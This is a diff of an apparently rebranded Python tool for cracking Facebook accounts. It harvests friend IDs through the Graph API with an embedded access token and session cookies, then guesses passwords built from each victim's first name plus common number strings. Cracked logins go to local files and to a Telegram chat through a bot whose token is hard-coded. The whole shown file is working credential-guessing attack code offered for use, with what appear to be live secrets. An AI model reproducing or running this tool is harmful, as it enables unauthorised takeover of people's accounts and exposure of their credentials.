@@ -6,27 +6,30 @@ except ModuleNotFoundError as x:
 	m = str(x).split("'")[1]
 	os.system(f'pip install {m}')
 from concurrent.futures import ThreadPoolExecutor as kil
-ID1 = '5705562178'
-token1 = '6930238082:AAG9y2qDEv7y04PoRzhLSm9BPkbyxT7__Kc'
-Id,token = input('\033[2;36mID : \033[1;97m'),input('\033[2;36mToken : \033[1;97m')
-kopo = requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(Id) + '&text=' + str('- تم تشغيل الاداة '))
-webbrowser.open('t.me/@M_O_L_B')
+chat_id = 5705562178
+bot_token = "6930238082:AAG9y2qDEv7y04PoRzhLSm9BPkbyxT7__Kc"
+Id,token = input('\033[2;36m- Enter ID Telegram ~ ادخل ايديك تلجرام : \033[1;97m'),input('\033[2;36m- Enter Token BOT Telegram ~ ادخل توكن البوت : \033[1;97m')
+kopo = requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(Id) + '&text=' + str('- Tool Run • تم تشغيل الاداة '))
+webbrowser.open('')
 if kopo.status_code == 404:
-	exit('\x1b[91;1m\n - ابن مصر ☠️ • ☒ التوكن او الايدي غلط ☒ ')	
+	exit('\x1b[91;1m\n - Kilwa • ☒ التوكن او الايدي غلط ☒ ')	
 bot = telebot.TeleBot(token,parse_mode='HTML')
 	
 os.system('clear')
 def Menu():
 	print('''\033[2;36m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       - Menu • القائمة -
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-[ 1 ] - Crack From File ~ صيد من ملف
-   
+\033[2;32m[ 1 ] - Crack From ID ~ صيد من ايديات
+[ 2 ] - Crack From File ~ صيد من ملف
+\033[2;36m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+   - Programmer • المبرمج ~ @Lx0b2
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~''')
 	c = input('   - Choose ~ اختار : ')
-	if c == '2':
+	if c == '1':
 		os.system('clear')
 		IDS()
-	elif c == '1':
+	elif c == '2':
 		os.system('clear')
 		File()
 		
@@ -35,7 +38,7 @@ z,total,ok,cp=0,0,0,0
 
 def get(user):
 	try:
-		url = requests.get('https://graph.facebook.com/{}'.format(user),params={'access_token': 'EAABwzLixnjYBO8aDgnZCXTXnwv91swARorjXxPtRfKOrqGejLbbgd6SXDN5RzrysOqQavJjCIrvPZB0FFCMJdZCJHUec6ZA8e7qQhLFodPKlJr9CXwb8MHZCzISXi4od26Ky1HNk6P1CpOBX6vgNY16JZB7CpfcEdoYDRTgmdZCWWWvhLdy53eCoZBuBtQBhUbQw3jgZD','fields': "friends"},headers={"user-agent": user_agent.generate_user_agent()},cookies={'cookies':'datr=ngTzZmui-wI5b-WG5PiyC2n0; sb=ngTzZj3jnDZFXrWbeKqDKBKq; m_pixel_ratio=2.75; wd=393x766; c_user=100092075492893; fr=0TkW3Jx0QDw9IjcL8.AWWxRXSg2QSwWMCVhbIsLdlZaHo.Bm8wSe..AAA.0.0.Bm8wS4.AWXJJJsOwOQ; xs=34%3ADmp8feGpUt-97Q%3A2%3A1727202489%3A-1%3A6642; m_page_voice=100092075492893'}).json()
+		url = requests.get('https://graph.facebook.com/{}'.format(user),params={'access_token': 'EAABwzLixnjYBO8aDgnZCXTXnwv91swARorjXxPtRfKOrqGejLbbgd6SXDN5RzrysOqQavJjCIrvPZB0FFCMJdZCJHUec6ZA8e7qQhLFodPKlJr9CXwb8MHZCzISXi4od26Ky1HNk6P1CpOBX6vgNY16JZB7CpfcEdoYDRTgmdZCWWWvhLdy53eCoZBuBtQBhUbQw3jgZD','fields': "friends"},headers={"user-agent": user_agent.generate_user_agent()},cookies={'cookies':'datr=qEjTZpW_vOk1sCkDh7mZHVsw; sb=qEjTZuPSAcIK23SR7SthOO5C; m_pixel_ratio=3; x-referer=eyJyIjoiL2NoZWNrcG9pbnQvMTUwMTA5MjgyMzUyNTI4Mi9sb2dvdXQvP25leHQ9aHR0cHMlM0ElMkYlMkZtLmZhY2Vib29rLmNvbSUyRiZwYWlwdj0wJmVhdj1BZmFwOVg4ZmNqS0U3TXdUTWt2LWNJdDJkaEdIZUlra3cyeFYzTWRTNU1ZZ2REalpBSzBCQkJUVzhEWmVlcXg1bVBZIiwiaCI6Ii9jaGVja3BvaW50LzE1MDEwOTI4MjM1MjUyODIvbG9nb3V0Lz9uZXh0PWh0dHBzJTNBJTJGJTJGbS5mYWNlYm9vay5jb20lMkYmcGFpcHY9MCZlYXY9QWZhcDlYOGZjaktFN013VE1rdi1jSXQyZGhHSGVJa2t3MnhWM01kUzVNWWdkRGpaQUswQkJCVFc4RFplZXF4NW1QWSIsInMiOiJtIn0%3D; wd=344x540; c_user=61560540485443; fr=0Dlh9guXYvCruJ4xN.AWXGrwQlwcmMEzSHoj2sK10AfV8.Bm00io..AAA.0.0.Bm0025.AWXoVR20eOA; xs=4%3Aervqck0gJWflaw%3A2%3A1725124026%3A-1%3A13754; locale=ar_AR; wl_cbv=v2%3Bclient_version%3A2608%3Btimestamp%3A1725124034; fbl_st=101329812%3BT%3A28752067; vpd=v1%3B540x344x3'}).json()
 		for mm in url['friends']['data']:
 			ko = (mm['id']+'|'+mm['name'])
 			if ko in fid:
@@ -60,7 +63,7 @@ def IDS():
 	
 def File():
 	try:
-		name = input('• File Name • : ')
+		name = input('• File Name • اسم او مسار الملف : ')
 		for line in open(name, 'r').readlines():
 			fid.append(line.strip())
 		print('- Total id • الايديات : '+str(len(fid)))
@@ -74,12 +77,12 @@ def password():
 		for kk in fid:
 			idf,nmf = kk.split('|')[0],kk.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = [nmf,frs+frs,frs+' '+frs,frs+'123',frs+'12345',frs+'123456',frs+'123456789',frs+'1234567890',frs+'1234512345',frs+'1122']
+			pwv = [nmf,frs+frs,frs+' '+frs,frs+'123',frs+'12345',frs+'123456',frs+'112233',frs+'11223344',frs+'1122334455',frs+'123456789',frs+'1234567890',frs+'2024',frs+'1122',frs+'1122334455@@',frs+'123@123',frs+'zzzzxxxx',frs+'١٢٣٤٥',frs+'Aa123456',frs+'qqwweerr']
 			kp.submit(checker,idf,pwv)
 
 def checker(idf,pwv):
 	global total,ok,cp
-	print('\r\033[2;36mϟ \033[1;97m[\033[2;36m🇪🇬المصري\033[1;97m☠️\033[2;36mاسير\033[2;32m] \033[1;97m~ \033[1;97m[\033[2;32mOK \033[1;97m- \033[1;31mCP\033[1;97m] = [\033[2;32m%s\033[1;97m -\033[1;31m %s\033[1;97m] = [\033[1;33m %s/%s\033[1;97m ]'%(ok,cp,total,len(fid)),end=' ');sys.stdout.flush()
+	print('\r\033[2;36mϟ \033[1;97m[\033[2;36mKILWA\033[1;97m-\033[2;36mTOOLS\033[2;32m] \033[1;97m~ \033[1;97m[\033[2;32mOK \033[1;97m- \033[1;31mCP\033[1;97m] = [\033[2;32m%s\033[1;97m -\033[1;31m %s\033[1;97m] = [\033[1;33m %s/%s\033[1;97m ]'%(ok,cp,total,len(fid)),end=' ');sys.stdout.flush()
 	for ps in pwv:
 		open('tt.txt','a').write(idf+'|'+ps+'\n')
 		try:
@@ -131,13 +134,13 @@ def checker(idf,pwv):
 ϟ Email -> <code>{idf}</code>
 ϟ Pass -> <code>{ps}</code>
 ~•~•~•~•~•~•~•~•~•~•~•~
-ϟ Programmer • @M_O_L_B 🔥</strong>'''
+ϟ Programmer • @Lx0b2 🔥</strong>'''
 				stp = f'''\033[1;31mϟ Secure Acc ~ حساب سكيور  
 ~•~•~•~•~•~•~•~•~•~•~•~
 ϟ Email -> {idf}
 ϟ Pass -> {ps}
 ~•~•~•~•~•~•~•~•~•~•~•~
-ϟ Programmer • @M_O_L_B 🔥'''
+ϟ Programmer • @Lx0b2 🔥'''
 				bot.send_message(Id,stc)
 				print(stp+'\n')
 				open('CPKilwa.txt','a').write(stc+'\n')
@@ -148,13 +151,13 @@ def checker(idf,pwv):
 ϟ Email -> <code>{idf}</code>
 ϟ Pass -> <code>{ps}</code>
 ~•~•~•~•~•~•~•~•~•~•~•~
-ϟ Programmer • @M_O_L_B 🔥</strong>'''
+ϟ Programmer • @Lx0b2 🔥</strong>'''
 				okp = f'''\033[2;32mϟ Good Acc ~ حساب صحيح ✅
 ~•~•~•~•~•~•~•~•~•~•~•~
 ϟ Email -> {idf}
 ϟ Pass -> {ps}
 ~•~•~•~•~•~•~•~•~•~•~•~
-ϟ Programmer • @M_O_L_B 🔥'''
+ϟ Programmer • @Lx0b2 🔥'''
 				bot.send_message(Id,okc)
 				print(okp+'\n')
 				open('OKKilwa.txt','a').write(okc+'\n')
